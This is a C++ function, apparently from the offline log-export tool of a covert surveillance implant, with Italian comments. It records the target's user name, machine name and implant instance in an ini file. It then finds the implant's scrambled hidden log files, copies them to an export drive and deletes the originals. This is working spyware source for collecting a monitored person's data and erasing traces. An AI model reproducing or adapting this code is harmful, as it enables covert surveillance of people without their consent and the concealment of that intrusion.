BOOL LogExport::OfflineRetrieve()
{
	char *scrambled_searchA;
	WCHAR scrambled_path[MAX_PATH];
	WCHAR clear_path[MAX_PATH];
	WCHAR dest_path[MAX_PATH];
	SYSTEMTIME system_time;
	FILETIME file_time;
	DWORD curr_file=1, tot_file=1;
	WCHAR progress_text[1024];

	HANDLE hFind;
	WIN32_FIND_DATAW find_data;

	// Setta la caption della finestra
	SetWindowText(m_user_name);

	// Crea una directory per i log di questo utente
	GetSystemTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);	
	swprintf_s(dest_path, sizeof(dest_path)/sizeof(dest_path[0]), L"%s\\%s_EXP_%.8X%.8X000000000000000000000000", m_dest_drive, m_rcs_info.rcs_name, file_time.dwHighDateTime, file_time.dwLowDateTime);
	if (!CreateDirectory(dest_path, NULL))
		return FALSE;

	// Crea il file con le info dell'utente
	swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\offline.ini", dest_path);
	PrepareIniFile(clear_path);
	if (!WritePrivateProfileStringW(L"OFFLINE", L"USERID", m_user_name, clear_path))
		return FALSE;
	if (!WritePrivateProfileStringW(L"OFFLINE", L"DEVICEID", m_computer_name, clear_path))
		return FALSE;
	if (!WritePrivateProfileStringW(L"OFFLINE", L"FACTORY", m_rcs_info.rcs_name, clear_path))
		return FALSE;
	if (!WritePrivateProfileStringW(L"OFFLINE", L"INSTANCE", m_user_hash, clear_path))
		return FALSE;

	if (m_os_type == WIN_OS) {
		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"WINDOWS", clear_path))
			return FALSE;
	} else if (m_os_type == MAC_OS) {
		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"MACOS", clear_path))
			return FALSE;
	} else {
		if (!WritePrivateProfileStringW(L"OFFLINE", L"PLATFORM", L"UNKNOWN", clear_path))
			return FALSE;
	}

	// Setta la data dell'export
	LARGE_INTEGER li_time, li_bias;
	FILETIME ft;
	SYSTEMTIME st;
	WCHAR wchar_date[128];
	GetLocalTime(&st);
	SystemTimeToFileTime(&st, &ft);
	li_time.HighPart = ft.dwHighDateTime;
	li_time.LowPart = ft.dwLowDateTime;
	li_bias.QuadPart = (int)m_time_bias;
	li_bias.QuadPart *= (60*1000*1000*10);
	li_time.QuadPart += li_bias.QuadPart;
	
	swprintf_s(wchar_date, sizeof(wchar_date)/sizeof(wchar_date[0]), L"%.8X.%.8X", li_time.HighPart, li_time.LowPart);
	if (!WritePrivateProfileStringW(L"OFFLINE", L"SYNCTIME", wchar_date, clear_path))
		return FALSE;

	// Enumera i log dell'utente
	if (m_os_type == WIN_OS) {
		if ( !(scrambled_searchA = LOG_ScrambleName2("?LOG*.???", (BYTE)(m_rcs_info.hscramb), TRUE)) )
			return FALSE;
	} else if (m_os_type == MAC_OS) {
		if ( !(scrambled_searchA = LOG_ScrambleName("LOG*.???", (BYTE)(m_rcs_info.hscramb), TRUE)) )
			return FALSE;
	} else
		return FALSE;
	swprintf_s(scrambled_path, sizeof(scrambled_path)/sizeof(scrambled_path[0]), L"%s\\%S", m_src_path, scrambled_searchA);
	SAFE_FREE(scrambled_searchA);

	// Conta il numero di file e setta il limite della progressbar
	if ( (hFind = FindFirstFileW(scrambled_path, &find_data)) == INVALID_HANDLE_VALUE )
		return TRUE;
	for(; FindNextFileW(hFind, &find_data); tot_file++);
	FindClose(hFind);
	m_progress.SetRange32(0, tot_file);
	m_progress.SetStep(1);

	// Enumera realmente i file
	if ( (hFind = FindFirstFileW(scrambled_path, &find_data)) == INVALID_HANDLE_VALUE )
		return TRUE;

	do {
		swprintf_s(progress_text, sizeof(progress_text)/sizeof(WCHAR), L"Copying file %d of %d", curr_file++, tot_file);
		m_progress_text.SetString(progress_text);
		UpdateData(FALSE);

		swprintf_s(scrambled_path, sizeof(scrambled_path)/sizeof(scrambled_path[0]), L"%s\\%s", m_src_path, find_data.cFileName);
		swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%s", dest_path, find_data.cFileName);
			
		if (find_data.nFileSizeLow==0 || CopyFileW(scrambled_path, clear_path, FALSE))
			DeleteFileW(scrambled_path);
		
		m_progress.StepIt();
	} while (FindNextFileW(hFind, &find_data));
	FindClose(hFind);		
	return TRUE;
}